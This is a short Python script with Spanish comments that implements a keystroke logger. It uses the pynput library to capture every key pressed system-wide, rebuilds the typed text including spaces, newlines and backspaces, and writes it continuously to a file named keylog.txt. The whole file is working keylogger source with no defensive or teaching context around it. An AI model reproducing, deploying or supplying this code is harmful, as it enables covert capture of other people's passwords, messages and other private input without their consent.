from pynput import keyboard

# Archivo donde se guarda el log
log_file = "keylog.txt"

# Inicializamos una cadena para el texto completo
buffer = ""

def on_press(key):
    global buffer

    try:
        # Teclas alfanuméricas y símbolos comunes
        buffer += key.char
    except AttributeError:
        # Teclas especiales
        if key == keyboard.Key.space:
            buffer += ' '
        elif key == keyboard.Key.enter:
            buffer += '\n'
        elif key == keyboard.Key.tab:
            buffer += '\t'
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]  # Borrar el último caracter
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r,
                     keyboard.Key.ctrl, keyboard.Key.ctrl_r,
                     keyboard.Key.alt, keyboard.Key.alt_r,
                     keyboard.Key.esc]:
            pass  # No registrar modificadores
        else:
            # Para otras teclas especiales, opcionalmente las representamos
            buffer += f'[{key.name}]'

    # Guardar en archivo sin saltos de línea por cada tecla
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(buffer)

# Iniciar el listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
